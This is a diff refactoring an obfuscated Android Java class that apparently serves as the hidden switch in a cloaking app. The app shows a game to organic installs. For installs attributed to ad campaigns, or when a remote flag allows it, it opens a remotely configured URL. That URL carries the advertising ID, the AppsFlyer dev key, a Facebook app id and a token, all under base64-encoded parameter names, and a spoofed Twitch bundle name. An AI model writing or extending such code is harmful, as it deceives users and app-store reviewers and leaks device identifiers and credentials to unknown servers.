@@ -47,8 +47,6 @@ public class GM {
     String vssvte = "tv.twitch.android.a";
 
 
-
-
     public StartActivityGM getStartActivityGM() {
         return startActivityGM;
     }
@@ -77,7 +75,7 @@ public class GM {
                             public void onComplete(@NonNull Task<Boolean> task) {
                                 if (task.isSuccessful()) {
                                     boolean updated = task.getResult();
-                                    Log.d("weq",updated+"");
+                                    Log.d("weq", updated + "");
                                     vdsvduv = bfdbd.getString("sta");
                                     vsdvdkf = bfdbd.getString("u");
                                     Log.d("weq", vdsvduv);
@@ -94,7 +92,7 @@ public class GM {
         }).start();
     }
 
-    public void  kfd(){
+    public void kfd() {
 
         AppsFlyerLib.getInstance().init(ewdc, new AppsFlyerConversionListener() {
             @Override
@@ -124,7 +122,8 @@ public class GM {
 
                     }
 
-                    nnhg = parseIF(vdtcfsa);}
+                    nnhg = parseIF(vdtcfsa);
+                }
             }
 
             @Override
@@ -141,24 +140,24 @@ public class GM {
             public void onAttributionFailure(String s) {
 
             }
-        },application);
+        }, application);
         AppsFlyerLib.getInstance().start(application);
     }
-
-    private String parseIF(String  vsfs) {
-
-        String vdsdgs;
-        String vdgshd;
-        String vdhsus;
-        String vvv;
-        String zzzz;
-        String nnnb;
-        String yyyt;
-        String qqwqwq;
-        String ooiyu;
-        String bgfds;
+    String vdsdgs;
+    String vdgshd;
+    String vdhsus;
+    String vvv;
+    String zzzz;
+    String nnnb;
+    String yyyt;
+    String qqwqwq;
+    String ooiyu;
+    String bgfds;
+    private String parseIF(String vsfs) {
         String ngdfvs = startActivityGM.getResources().getString(R.string.id);
         String bfsfwd = startActivityGM.getResources().getString(R.string.tok);
+
+
 
         String[] bbgds = vsfs.split("_");
 
@@ -221,28 +220,32 @@ public class GM {
         }
 
 
-        String gdwfs[] = {decodeGM("P21lZGlhX3NvdXJjZT0="), vsgsg,
-                decodeGM("JnN1YjE9"), vdsdgs,
-                decodeGM("JnN1YjI9"), vdgshd,
-                decodeGM("JnN1YjM9"), vdhsus,
-                decodeGM("JnN1YjQ9"), vvv,
-                decodeGM("JnN1YjU9"), zzzz,
-                decodeGM("JnN1YjY9"), nnnb,
-                decodeGM("JnN1Yjc9"), yyyt,
-                decodeGM("JnN1Yjg9"), qqwqwq,
-                decodeGM("JnN1Yjk9"), ooiyu,
-                decodeGM("JnN1YjEwPQ=="), bgfds,
-                decodeGM("JmNhbXBhaWduPQ=="), vdtcfsa,
-                decodeGM("Jmdvb2dsZV9hZGlkPQ=="), nnfdv,
-                decodeGM("JmFmX3VzZXJpZD0="), vdbds,
-                decodeGM("JmFmX2NoYW5uZWw9"), bntdd,
-                decodeGM("JmRldl9rZXk9"), ewdc,
-                decodeGM("JmJ1bmRsZT0="), vssvte,
-                decodeGM("JmZiX2FwcF9pZD0="),ngdfvs,
-                decodeGM("JmZiX2F0PQ=="), bfsfwd};
+        String gdwfs[] = {vsgsg, vdsdgs, vdgshd, vdhsus, vvv, zzzz, nnnb, yyyt, qqwqwq, ooiyu, bgfds, vdtcfsa, nnfdv, vdbds, bntdd, ewdc, vssvte, ngdfvs, bfsfwd};
+
+        String fds[] = {decodeGM("P21lZGlhX3NvdXJjZT0="),
+                decodeGM("JnN1YjE9"),
+                decodeGM("JnN1YjI9"),
+                decodeGM("JnN1YjM9"),
+                decodeGM("JnN1YjQ9"),
+                decodeGM("JnN1YjU9"),
+                decodeGM("JnN1YjY9"),
+                decodeGM("JnN1Yjc9"),
+                decodeGM("JnN1Yjg9"),
+                decodeGM("JnN1Yjk9"),
+                decodeGM("JnN1YjEwPQ=="),
+                decodeGM("JmNhbXBhaWduPQ=="),
+                decodeGM("Jmdvb2dsZV9hZGlkPQ=="),
+                decodeGM("JmFmX3VzZXJpZD0="),
+                decodeGM("JmFmX2NoYW5uZWw9"),
+                decodeGM("JmRldl9rZXk9"),
+                decodeGM("JmJ1bmRsZT0="),
+                decodeGM("JmZiX2FwcF9pZD0="),
+                decodeGM("JmZiX2F0PQ==")};
+
 
         StringBuilder bbbbf = new StringBuilder();
         for (int i = 0; i < gdwfs.length; i++) {
+            bbbbf.append(fds[i]);
             bbbbf.append(gdwfs[i]);
         }
 
@@ -250,7 +253,7 @@ public class GM {
 
     }
 
-    public void gf(){
+    public void gf() {
         FacebookSdk.setAutoInitEnabled(true);
         FacebookSdk.fullyInitialize();
         AppEventsLogger.activateApp(application);
@@ -277,58 +280,37 @@ public class GM {
 
 
     int jj;
-    public void fgd(StartActivityGM startActivityGM){
+
+    public void fgd(StartActivityGM startActivityGM) {
         Handler nngf = new Handler();
         nngf.post(new Runnable() {
             @Override
             public void run() {
-                String dd = startActivityGM.getResources().getString(R.string.id);
-                String gg = startActivityGM.getResources().getString(R.string.tok);
+
                 if (!nnfgdf.equals("-") || !vsdgdwf.equals("-")) {
                     if (nnfgdf.equals(decodeGM("Tm9uLW9yZ2FuaWM="))) {
                         String vdrds = vsdvdkf + nnhg;
-                        startActivityGM.getSharedPreferences(startActivityGM.getPackageName(), startActivityGM.MODE_PRIVATE).edit().putString(decodeGM("c2F2ZWRVcmw="), vdrds).apply();
-                        Intent intent = new Intent(startActivityGM.getApplicationContext(), BUActivityGM.class);
-                        intent.putExtra("buuul",true);
-                        intent.putExtra("urr",vdrds);
-                        startActivityGM.startActivity(intent);
-                        Log.d("weq","app"+vdrds);
+                        kgn(vdrds);
+                        ufn(vdrds);
+                        Log.d("weq", "app" + vdrds);
                         jj = 1;
 
                     } else if (bfdvfd != null) {
                         String tytew = vsdvdkf + vsdgdwf;
-                        startActivityGM.getSharedPreferences(startActivityGM.getPackageName(), startActivityGM.MODE_PRIVATE).edit().putString(decodeGM("c2F2ZWRVcmw="), tytew).apply();
-                        Intent intent = new Intent(startActivityGM.getApplicationContext(), BUActivityGM.class);
-                        intent.putExtra("buuul",true);
-                        intent.putExtra("urr",tytew);
-                        startActivityGM.startActivity(intent);
+                        kgn(tytew);
+                        ufn(tytew);
                         jj = 1;
-                        Log.d("weq","deep"+tytew);
+                        Log.d("weq", "deep" + tytew);
 
                     } else {
                         if (vdsvduv.equals("0")) {
-                            Intent intent = new Intent(startActivityGM.getApplicationContext(), BUActivityGM.class);
-                            intent.putExtra("buuul",false);
-                            startActivityGM.startActivity(intent);
+                            kkf();
                             jj = 1;
-                            Log.d("weq","game");
+                            Log.d("weq", "game");
 
                         } else {
 
-                            String bfrew = vsdvdkf + decodeGM("P21lZGlhX3NvdXJjZT1vcmdhbmlj") +
-                                    decodeGM("Jmdvb2dsZV9hZGlkPQ==") + nnfdv +
-                                    decodeGM("JmFmX3VzZXJpZD0=") + vdbds +
-                                    decodeGM("JmRldl9rZXk9") + ewdc +
-                                    decodeGM("JmJ1bmRsZT0=") + startActivityGM.getPackageName() +
-                                    decodeGM("JmZiX2FwcF9pZD0=") + dd +
-                                    decodeGM("JmZiX2F0PQ==") + gg;
-                            startActivityGM.getSharedPreferences(startActivityGM.getPackageName(), startActivityGM.MODE_PRIVATE).edit().putString(decodeGM("c2F2ZWRVcmw="), bfrew).apply();
-                            Intent intent = new Intent(startActivityGM.getApplicationContext(), BUActivityGM.class);
-                            intent.putExtra("buuul",true);
-                            intent.putExtra("urr",bfrew);
-                            startActivityGM.startActivity(intent);
-                            jj = 1;
-                            Log.d("weq","org"+bfrew);
+                            dhdk();
 
                         }
                     }
@@ -336,14 +318,46 @@ public class GM {
                 } else {
                 }
 
-
-
                 if (jj != 1) {
                     nngf.postDelayed(this::run, 1000);
                 }
             }
         });
 
+
+    }
+
+    private void kgn(String fff) {
+        startActivityGM.getSharedPreferences(startActivityGM.getPackageName(), startActivityGM.MODE_PRIVATE).edit().putString(decodeGM("c2F2ZWRVcmw="), fff).apply();
+    }
+
+    private void dhdk() {
+        String dd = startActivityGM.getResources().getString(R.string.id);
+        String gg = startActivityGM.getResources().getString(R.string.tok);
+        String bfrew = vsdvdkf + decodeGM("P21lZGlhX3NvdXJjZT1vcmdhbmlj") +
+                decodeGM("Jmdvb2dsZV9hZGlkPQ==") + nnfdv +
+                decodeGM("JmFmX3VzZXJpZD0=") + vdbds +
+                decodeGM("JmRldl9rZXk9") + ewdc +
+                decodeGM("JmJ1bmRsZT0=") + startActivityGM.getPackageName() +
+                decodeGM("JmZiX2FwcF9pZD0=") + dd +
+                decodeGM("JmZiX2F0PQ==") + gg;
+        kgn(bfrew);
+        ufn(bfrew);
+        jj = 1;
+        Log.d("weq", "org" + bfrew);
+    }
+
+    private void ufn(String ddd) {
+        Intent intent = new Intent(startActivityGM.getApplicationContext(), BUActivityGM.class);
+        intent.putExtra("buuul", true);
+        intent.putExtra("urr", ddd);
+        startActivityGM.startActivity(intent);
+    }
+
+    private void kkf() {
+        Intent intent = new Intent(startActivityGM.getApplicationContext(), BUActivityGM.class);
+        intent.putExtra("buuul", false);
+        startActivityGM.startActivity(intent);
     }
 
 
